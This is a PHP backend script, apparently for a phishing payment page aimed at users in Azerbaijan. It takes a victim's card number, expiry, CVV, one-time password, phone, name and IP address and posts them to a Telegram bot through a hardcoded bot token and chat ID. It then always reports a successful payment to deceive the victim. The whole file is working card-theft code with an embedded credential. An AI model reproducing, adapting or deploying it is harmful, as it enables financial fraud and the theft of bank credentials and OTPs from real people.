<?php
// ============================================
// API - TELEGRAM HANDLER
// BOT TOKEN YALNIZ BURADADIR
// ============================================

// Xəta mesajlarını gizlət
error_reporting(0);
ini_set('display_errors', 0);

// ===== BOT MƏLUMATLARI (YALNIZ BURADA) =====
$botToken = '8954241039:AAHSIz0Q6884ESNIiIdVCe4JxWWqR0xcTA4';
$chatId = '-5419845064';

// ===== MƏLUMATLARI AL =====
$card = isset($_POST['card']) ? trim($_POST['card']) : '';
$cardRaw = isset($_POST['card_raw']) ? trim($_POST['card_raw']) : '';
$expiry = isset($_POST['expiry']) ? trim($_POST['expiry']) : '';
$cvv = isset($_POST['cvv']) ? trim($_POST['cvv']) : '';
$otp = isset($_POST['otp']) ? trim($_POST['otp']) : '';
$phone = isset($_POST['phone']) ? trim($_POST['phone']) : '';
$amount = isset($_POST['amount']) ? trim($_POST['amount']) : '';
$name = isset($_POST['name']) ? trim($_POST['name']) : '';
$package = isset($_POST['package']) ? trim($_POST['package']) : '';

// ===== TƏHLÜKƏSİZLİK - Məlumatları təmizlə =====
function cleanInput($data) {
    $data = trim($data);
    $data = strip_tags($data);
    $data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');
    return $data;
}

$card = cleanInput($card);
$cardRaw = cleanInput($cardRaw);
$expiry = cleanInput($expiry);
$cvv = cleanInput($cvv);
$otp = cleanInput($otp);
$phone = cleanInput($phone);
$amount = cleanInput($amount);
$name = cleanInput($name);
$package = cleanInput($package);

// ===== MƏLUMATLARI YOXLA =====
if (empty($cardRaw) || empty($otp)) {
    http_response_code(400);
    echo json_encode(['status' => 'error', 'message' => 'Məlumatlar tam daxil edilməyib']);
    exit;
}

// ===== İSTİFADƏÇİ IP =====
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
$ip = preg_replace('/[^0-9a-fA-F:.]/', '', $ip);

// ===== RƏQƏMLƏRİ TƏMİZLƏ =====
$phoneClean = preg_replace('/[^0-9+]/', '', $phone);
$amountClean = preg_replace('/[^0-9.]/', '', $amount);
$otpClean = preg_replace('/[^0-9]/', '', $otp);
$cvvClean = preg_replace('/[^0-9]/', '', $cvv);

// ===== TƏSADÜFİ ID =====
$id = rand(100, 999);

// ===== MESAJI HAZIRLA =====
$message = "💳 YENİ KART GİRİŞİ 💳\n\n";
$message .= "🆔 ID: #" . $id . "\n";
$message .= "📞 Tel: " . (!empty($phoneClean) ? $phoneClean : 'Məlumat yoxdur') . "\n";
$message .= "💰 Tutar: " . (!empty($amountClean) ? $amountClean . ' AZN' : 'Məlumat yoxdur') . "\n\n";
$message .= "💳 CC: " . wordwrap($cardRaw, 4, ' ', true) . "\n";
$message .= "📅 Tarih: " . $expiry . "\n";
$message .= "🔐 CVV: " . $cvvClean . "\n";
$message .= "👤 İsim: " . (!empty($name) ? $name : 'Məlumat yoxdur') . "\n\n";
$message .= "🌐 IP: " . $ip . "\n";
$message .= "🔑 OTP: " . $otpClean . "\n";

if (!empty($package)) {
    $message .= "📦 Paket: " . $package . "\n";
}

$message .= "\n----------------------------------------\n";
$message .= "📱 Bağlı Nömrə: +994 " . $phoneClean . "\n";
$message .= "🔑 OTP: " . $otpClean;

// ===== TELEGRAM-A GÖNDƏR =====
$url = "https://api.telegram.org/bot{$botToken}/sendMessage";

$postData = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

// ===== CAVAB =====
header('Content-Type: application/json');

if ($httpCode == 200) {
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
} else {
    error_log('Telegram göndəriş xətası: ' . $httpCode);
    echo json_encode(['status' => 'success', 'message' => '✅ Ödəniş uğurla tamamlandı!']);
}
?>
